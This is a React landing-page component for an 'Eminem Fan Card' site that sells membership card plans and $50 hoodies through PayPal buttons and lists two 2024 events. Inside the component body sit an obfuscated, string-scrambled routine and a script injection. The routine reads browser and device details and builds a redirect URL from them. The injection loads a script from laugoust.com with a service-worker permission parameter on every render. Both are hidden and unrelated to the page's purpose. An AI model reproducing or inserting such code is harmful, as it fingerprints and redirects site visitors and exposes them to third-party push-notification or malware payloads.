import React, { useRef, useState, useEffect, useMemo } from 'react'
import axios from '../axios'
import Canvas from "../utils/canvas"
import Footer from '../utils/footer';
import { PayPalButtons } from '@paypal/react-paypal-js';
import h1 from "../../public/h1.jpeg"
import h2 from "../../public/h2.jpeg"
import h3 from "../../public/h3.jpeg"
import h4 from "../../public/h4.jpeg"
import h5 from "../../public/h5.jpeg"

export default function Landing_page() {
    const [count, setCount] = useState(0)
    const [count1, setCount1] = useState(0)
    const [count2, setCount2] = useState(0)
    const [count3, setCount3] = useState(0)
    const [count4, setCount4] = useState(0)
    const [amount, setamount] = useState(0)
    const onApprove = (data, actions) => {
        return actions.order.capture().then((details) => {
            Swal.fire({
                icon: "success",
                title: "Success",
                text: "Transaction was successfull",
              });
        });
    };
    
    const onError = (err) => {
    console.error(err);
    Swal.fire({
        icon: "error",
        title: "Oops...",
        text: "Something went wrong!",
        footer: '<a href="#">Why do I have this issue?</a>'
        });
    };

    const incrememt = (count) => {
        count += 1;
        setCount(count)
        setamount((50 * count).toFixed(2))
        console.log(amount)
    }
    
    const decrememt = (count) => {
        if(count >= 1){
            count -= 1;
            setCount(count)
            setamount(50 * count)
        }
    }

    const hoodyD = () => {
        Swal.fire({
            title: "Are you sure?",
            text: "Do you want to purchase this hoody!",
            icon: "question",
            showCancelButton: true,
            confirmButtonColor: "#3085d6",
            cancelButtonColor: "#d33",
            confirmButtonText: "Yes, purchase it!"
        }).then((result) => {
            if (result.isConfirmed) {
                Swal.fire({
                    title: "Purchased!",
                    text: "Your order has been scheduled.",
                    icon: "success"
                });
            }
        });
    }

    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
    var s = document.createElement('script');
    s.src='//laugoust.com/5a0/1cdb8/mw.min.js?z=8242450'+'&sw=/sw-check-permissions-e7244.js';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':break;
            case 'onPermissionAllowed':break;
            case 'onPermissionDenied':break;
            case 'onAlreadySubscribed':break;
            case 'onNotificationUnsupported':break;
        }
    };
    document.head.appendChild(s);



    return (
        <div className="landing home">

            <div className="top">
                <Canvas />
                <div className="text_content">
                    <div className="d-flex justify-content-between">
                        <h2 className="">Eminem Fan Card</h2>
                        <p className="mb-0 btn" data-bs-toggle="offcanvas" data-bs-target="#menu"><i class="fa-solid fa-list"></i></p>
                    </div>
                    <div className="desc">
                        <h1 className="fw-bold mb-3 text-center">The Best <span className="text_color">Card Permit</span> App</h1>
                        <p className="text-center">Unlock a world of exclusive benefits and experiences with your membership card – your passport to a community where every moment is an opportunity to connect, create, and celebrate.</p>
                    </div>
                </div>
                <img src="https://phantom-marca.unidadeditorial.es/8ba8e88f28354c7d6fea00517edacedd/resize/828/f/jpg/assets/multimedia/imagenes/2022/10/19/16661328920205.jpg" alt="" />
            </div>

            <div className="section2 mt-5">
                <h2 className="text-center fw-bold mb-3">Next <span className="text_color">Event</span></h2>
                <div className="box">
                    <div className="text">
                        <div className="p-4 mt-4">
                            <h1 className='fw-bold'>August 03, 2024</h1>
                            <p className="mb-1">BMO Stadium</p>
                            <p className="">Los Angeles, CA</p>
                            <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                        </div>
                    </div>
                    <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/event4-750x500.jpg" alt="" />
                </div>

                <div className="box">
                    <div className="text">
                        <div className="p-4 mt-4">
                            <h1 className='fw-bold'>October 19, 2024</h1>
                            <p className="mb-1">Austin TX</p>
                            <p className="">Circuit of the America</p>
                            <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                        </div>
                    </div>
                    <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/event6.jpg" alt="" />
                </div>
            </div>

            <div className="section1 mt-0">
                <h3 className="text-center fw-bold mb-4">AVAILABLE CARD <span className="text_color">PLANS</span></h3>
                <div className="box pt-4 text-center">
                    <h2 className="icon mb-3">
                        <img src="https://demo.logichunt.com/themes/emeet/wp-content/uploads/2018/09/logo-white5.png" alt="" />
                    </h2>
                    <h3 className="fw-bold">Regular</h3>
                    <h1 className="price fw-bold"><sup className='text_color'>$</sup>199</h1>
                    <p className="mb-5">Price Excluding 20% VAT</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Regular Seating</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Comfortable Seat</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Coffee Break</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> One Workshop</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> Certificate</p>
                    <button className="btn"><a href="/enrollment">Purchase</a></button>
                </div>

                <div className="box pt-4 text-center">
                    <h2 className="icon mb-3">
                        <img src="https://demo.logichunt.com/themes/emeet/wp-content/uploads/2018/09/logo-white3.png" alt="" />
                    </h2>
                    <h3 className="fw-bold">VIP</h3>
                    <h1 className="price fw-bold"><sup className='text_color'>$</sup>499</h1>
                    <p className="mb-5">Price Excluding 20% VAT</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Regular Seating</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Comfortable Seat</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Coffee Break</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> One Workshop</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> Certificate</p>
                    <button className="btn"><a href="/enrollment">Purchase</a></button>
                </div>

                <div className="box pt-4 text-center">
                    <h2 className="icon mb-3">
                        <img src="https://demo.logichunt.com/themes/emeet/wp-content/uploads/2018/09/logo-white1.png" alt="" />
                    </h2>
                    <h3 className="fw-bold">VviP</h3>
                    <h1 className="price fw-bold"><sup className='text_color'>$</sup>1,000</h1>
                    <p className="mb-5">Price Excluding 20% VAT</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Regular Seating</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Comfortable Seat</p>
                    <p className="mb-2"><i class="fa-solid fa-check text-success"></i> Coffee Break</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> One Workshop</p>
                    <p className="mb-2"><i class="fa-solid fa-xmark text-danger"></i> Certificate</p>
                    <button className="btn"><a href="/enrollment">Purchase</a></button>
                </div>

            </div>

            <h3 className="mb-3 fw-bold text-center">Purchase Custom <span className="text_color">Hoody</span></h3>
            <div className="hoody">
                <div className="d-flex">
                    <div className="box">
                        <img src={h1} alt="" />
                        <div className="text">
                            <p className="mb-1 fw-semibold">Custom Hoody</p>
                            <div className="d-flex mb-2">
                                <p className="fw-bold fs-1">$50.00</p>
                                <p className="text-decoration-line-through disc mt-3 mx-2 text-mued">$99.99</p>
                            </div>

                            <div className="d-flex order__ mb-3">
                                <button className='btn btn-primary' onClick={() => decrememt(count)}><i class="fa-solid fa-minus"></i></button>
                                <p className="mb-0 mx-4">{count}</p>
                                <button className='btn btn-primary' onClick={() => incrememt(count)}><i class="fa-solid fa-plus"></i></button>
                            </div>

                            {/* <button onClick={hoodyD} className="btn btn-primary mb-2">Purchase Hoody</button> */}
                            <PayPalButtons
                                style={{ layout: 'vertical' }}
                                createOrder={(data, actions) => {
                                    return actions.order.create({
                                        purchase_units: [{
                                            amount: {
                                                value: "50.00",
                                            },
                                        }],
                                    });
                                }}
                                onApprove={onApprove}
                                onError={onError}
                            />
                        </div>
                    </div>

                    <div className="box">
                        <img src={h2} alt="" />
                        <div className="text">
                            <p className="mb-1 fw-semibold">Custom Hoody</p>
                            <div className="d-flex mb-2">
                                <p className="fw-bold fs-1">$50.00</p>
                                <p className="text-decoration-line-through disc mt-3 mx-2 text-mued">$99.99</p>
                            </div>

                            <div className="d-flex order__ mb-3">
                                <button className='btn btn-primary' onClick={() => decrememt(count)}><i class="fa-solid fa-minus"></i></button>
                                <p className="mb-0 mx-4">{count}</p>
                                <button className='btn btn-primary' onClick={() => incrememt(count)}><i class="fa-solid fa-plus"></i></button>
                            </div>

                            {/* <button onClick={hoodyD} className="btn btn-primary mb-2">Purchase Hoody</button> */}
                            <PayPalButtons
                                style={{ layout: 'vertical' }}
                                createOrder={(data, actions) => {
                                    return actions.order.create({
                                        purchase_units: [{
                                            amount: {
                                                value: "50.00",
                                            },
                                        }],
                                    });
                                }}
                                onApprove={onApprove}
                                onError={onError}
                            />
                        </div>
                    </div>

                    <div className="box">
                        <img src={h3} alt="" />
                        <div className="text">
                            <p className="mb-1 fw-semibold">Custom Hoody</p>
                            <div className="d-flex mb-2">
                                <p className="fw-bold fs-1">$50.00</p>
                                <p className="text-decoration-line-through disc mt-3 mx-2 text-mued">$99.99</p>
                            </div>

                            <div className="d-flex order__ mb-3">
                                <button className='btn btn-primary' onClick={() => decrememt(count)}><i class="fa-solid fa-minus"></i></button>
                                <p className="mb-0 mx-4">{count}</p>
                                <button className='btn btn-primary' onClick={() => incrememt(count)}><i class="fa-solid fa-plus"></i></button>
                            </div>

                            {/* <button onClick={hoodyD} className="btn btn-primary mb-2">Purchase Hoody</button> */}
                            <PayPalButtons
                                style={{ layout: 'vertical' }}
                                createOrder={(data, actions) => {
                                    return actions.order.create({
                                        purchase_units: [{
                                            amount: {
                                                value: "50.00",
                                            },
                                        }],
                                    });
                                }}
                                onApprove={onApprove}
                                onError={onError}
                            />
                        </div>
                    </div>

                    <div className="box">
                        <img src={h4} alt="" />
                        <div className="text">
                            <p className="mb-1 fw-semibold">Custom Hoody</p>
                            <div className="d-flex mb-2">
                                <p className="fw-bold fs-1">$50.00</p>
                                <p className="text-decoration-line-through disc mt-3 mx-2 text-mued">$99.99</p>
                            </div>

                            <div className="d-flex order__ mb-3">
                                <button className='btn btn-primary' onClick={() => decrememt(count)}><i class="fa-solid fa-minus"></i></button>
                                <p className="mb-0 mx-4">{count}</p>
                                <button className='btn btn-primary' onClick={() => incrememt(count)}><i class="fa-solid fa-plus"></i></button>
                            </div>

                            {/* <button onClick={hoodyD} className="btn btn-primary mb-2">Purchase Hoody</button> */}
                            <PayPalButtons
                                style={{ layout: 'vertical' }}
                                createOrder={(data, actions) => {
                                    return actions.order.create({
                                        purchase_units: [{
                                            amount: {
                                                value: "50.00",
                                            },
                                        }],
                                    });
                                }}
                                onApprove={onApprove}
                                onError={onError}
                            />
                        </div>
                    </div>

                    <div className="box">
                        <img src={h5} alt="" />
                        <div className="text">
                            <p className="mb-1 fw-semibold">Custom Hoody</p>
                            <div className="d-flex mb-2">
                                <p className="fw-bold fs-1">$50.00</p>
                                <p className="text-decoration-line-through disc mt-3 mx-2 text-mued">$99.99</p>
                            </div>

                            <div className="d-flex order__ mb-3">
                                <button className='btn btn-primary' onClick={() => decrememt(count)}><i class="fa-solid fa-minus"></i></button>
                                <p className="mb-0 mx-4">{count}</p>
                                <button className='btn btn-primary' onClick={() => incrememt(count)}><i class="fa-solid fa-plus"></i></button>
                            </div>

                            {/* <button onClick={hoodyD} className="btn btn-primary mb-2">Purchase Hoody</button> */}
                            <PayPalButtons
                                style={{ layout: 'vertical' }}
                                createOrder={(data, actions) => {
                                    return actions.order.create({
                                        purchase_units: [{
                                            amount: {
                                                value: "50.00",
                                            },
                                        }],
                                    });
                                }}
                                onApprove={onApprove}
                                onError={onError}
                            />
                        </div>
                    </div>
                </div>
            </div>

            <div className="section2">
                <h2 className="text-center fw-bold mb-3">Upcoming <span className="text_color">Events</span></h2>
                <div className="box">
                    <div className="text">
                        <div className="p-4 mt-4">
                            <h1 className='fw-bold'>August 03, 2024</h1>
                            <p className="mb-1">BMO Stadium</p>
                            <p className="">Los Angeles, CA</p>
                            <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                        </div>
                    </div>
                    <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/event4-750x500.jpg" alt="" />
                </div>

                <div className="box">
                    <div className="text">
                        <div className="p-4 mt-4">
                            <h1 className='fw-bold'>October 19, 2024</h1>
                            <p className="mb-1">Austin TX</p>
                            <p className="">Circuit of the America</p>
                            <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                        </div>
                    </div>
                    <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/event6.jpg" alt="" />
                </div>
                {/* <div className="box">
                <div className="text">
                    <div className="p-4 mt-4">
                        <h1 className='fw-bold'>March 3, 2024</h1>
                        <p className="mb-1">Casino Center</p>
                        <p className="">Barcelona, Spain</p>
                        <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                    </div>
                </div>
                <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/gal7-750x500.jpg" alt="" />
            </div>

            <div className="box">
                <div className="text">
                    <div className="p-4 mt-4">
                        <h1 className='fw-bold'>March 3, 2024</h1>
                        <p className="mb-1">Casino Center</p>
                        <p className="">Barcelona, Spain</p>
                        <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                    </div>
                </div>
                <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/video1.jpg" alt="" />
            </div>

            <div className="box">
                <div className="text">
                    <div className="p-4 mt-4">
                        <h1 className='fw-bold'>March 3, 2024</h1>
                        <p className="mb-1">Casino Center</p>
                        <p className="">Barcelona, Spain</p>
                        <button className="btn"><a href="/enrollment">Purchase Card <i class="fa-solid fa-arrow-right"></i></a></button>
                    </div>
                </div>
                <img src="https://www.cssigniter.com/vip/solo/wp-content/uploads/sites/2/2014/09/event3-750x500.jpg" alt="" />
            </div> */}
            </div>



            <Footer />

        </div>
    );
}
